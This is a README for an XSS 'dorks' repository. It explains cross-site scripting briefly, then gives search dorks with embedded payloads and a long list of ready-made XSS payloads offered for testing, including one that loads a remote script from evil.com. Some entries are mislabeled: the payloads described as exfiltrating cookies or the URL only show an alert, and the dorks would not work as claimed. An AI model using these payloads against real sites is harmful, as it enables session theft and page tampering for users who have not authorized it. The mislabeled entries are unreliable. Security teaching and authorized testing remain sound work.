# Cross-Site Scripting (XSS) Dorks Repository

![Cross-Site Scripting](https://img.shields.io/badge/Cross--Site%20Scripting-red)

Welcome to the Cross-Site Scripting (XSS) Dorks repository! This repository contains a collection of XSS dorks and an explanation of what XSS is, along with advanced examples of XSS dorks.

## Table of Contents
- [What is Cross-Site Scripting (XSS)?](#what-is-cross-site-scripting-xss)
- [Examples of Cross-Site Scripting (XSS) Dorks](#examples-of-cross-site-scripting-xss-dorks)
- [Understanding XSS](#understanding-xss)
- [Advanced XSS Concepts](#advanced-xss-concepts)
- [Exploring the GDorks Main Repository](#exploring-the-gdorks-main-repository)
- [How to Use This Repository](#how-to-use-this-repository)
- [Contributing](#contributing)


## What is Cross-Site Scripting (XSS)?

Cross-Site Scripting (XSS) is a security vulnerability found in web applications that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts execute within the browser, compromising user sessions, stealing data, or redirecting users to malicious sites.

## Examples of Cross-Site Scripting (XSS) Dorks

Here are advanced examples of Cross-Site Scripting (XSS) dorks that illustrate various attack vectors:

1. **<img> Tag XSS Dork**: This dork can be used to identify websites vulnerable to XSS using the `<img>` tag.

   ```
   inurl:/profile.php?username=<img src="javascript:alert('XSS')" />
   ```

2. **Event Handler XSS Dork**: Identifies websites vulnerable to XSS through event handler attributes.

   ```
   inurl:/news.php?id=1" onmouseover="alert('XSS')"--
   ```

3. **Script Injection through Input Fields**: Detects websites susceptible to XSS via input fields.

   ```
   inurl:/search?query=<script>alert('XSS')</script>
   ```

## Comprehensive Cross-Site Scripting (XSS) Payloads

XSS payloads come in various forms and contexts, allowing for diverse exploitation scenarios. Below are examples of XSS payloads in different formats, contexts, and encodings, enabling the demonstration and testing of XSS vulnerabilities:

1. **Basic Alert Payload:**

   ```javascript
   <script>alert('XSS')</script>
   ```

2. **Image Source Payload:**

   ```javascript
   <img src="javascript:alert('XSS')" />
   ```

3. **Input Field Payload:**

   ```javascript
   <input type="text" value="<script>alert('XSS')</script>" />
   ```

4. **Event Handler Payload:**

   ```javascript
   <div onmouseover="alert('XSS')">Mouse over me</div>
   ```

5. **Encoded Payloads:**

   - Basic Alert Payload encoded as URL: `%3Cscript%3Ealert('XSS')%3C%2Fscript%3E`
   - Base64 encoded Payload: `PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`

6. **SVG-based Payloads:**

   ```xml
   <svg onload="alert('XSS')" />
   ```

   ```xml
   <svg><script>alert('XSS')</script></svg>
   ```

7. **URL Payloads:**

   - URL payload as a query parameter: `http://example.com/?name=<script>alert('XSS')</script>`

8. **Image Payload with Invalid Source:**

   ```javascript
   <img src="invalid" onerror="alert('XSS')" />
   ```

9. **Data URI Payload:**

   ```html
   <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click me</a>
   ```

10. **DOM-based Payloads:**

    - Using document.cookie to exfiltrate cookies: `';alert(String.fromCharCode(88,83,83))//'`
    - Using location.href to exfiltrate the URL: `';alert(document.location)//`
   
11. **HTML Event Payloads:**

    - XSS via onerror attribute: `<img src="test" onerror="alert('XSS')" />`
    - XSS via onfocus attribute: `<input type="text" onfocus="alert('XSS')" />`
    - XSS via onload attribute: `<body onload="alert('XSS')" />`

12. **Script Tag Payloads:**

    - Embedding scripts as part of the content: `<script>alert('XSS')</script>`
    - Executing scripts from the URL parameter: `<script src="http://evil.com/malicious.js"></script>`

Feel free to use these payloads to test for XSS vulnerabilities in web applications. Always ensure you have proper authorization and consent before performing any security testing.

Keep in mind that these examples are for educational purposes, and using them for unauthorized testing or exploitation is strictly prohibited.

## Understanding XSS
XSS vulnerabilities can have severe implications, including data theft, session hijacking, and unauthorized access. Understanding the different types of XSS and employing secure coding practices can help prevent such vulnerabilities.

## Advanced XSS Concepts

Advanced XSS involves bypassing filters, utilizing different encoding techniques, and exploiting client-side vulnerabilities. Techniques include DOM-based XSS, circumventing Content Security Policy (CSP), and using JavaScript obfuscation to evade detection.

## Exploring the GDorks Main Repository

The [GDorks repository](https://github.com/Ishanoshada/GDorks/) is a rich resource housing an extensive collection of XSS dorks, categorized folders, and comprehensive documentation covering various XSS attack vectors and methods. It's an invaluable resource for learning and protecting against XSS vulnerabilities.

## How to Use This Repository

This repository is organized into folders, each containing specific XSS dorks and related information. Users can browse through the folders to explore XSS dorks of interest.

To contribute to this repository, follow the steps outlined in the [Contributing](#contributing) section.

## Contributing

Contributions to this repository are welcome! If you have additional XSS dorks, examples, or documentation to share, please follow these steps:

1. Fork the repository.
2. Create a new branch with a descriptive name.
3. Add your XSS dorks or other content.
4. Submit a pull request.

Your contributions will help make this repository more comprehensive and informative for the community.
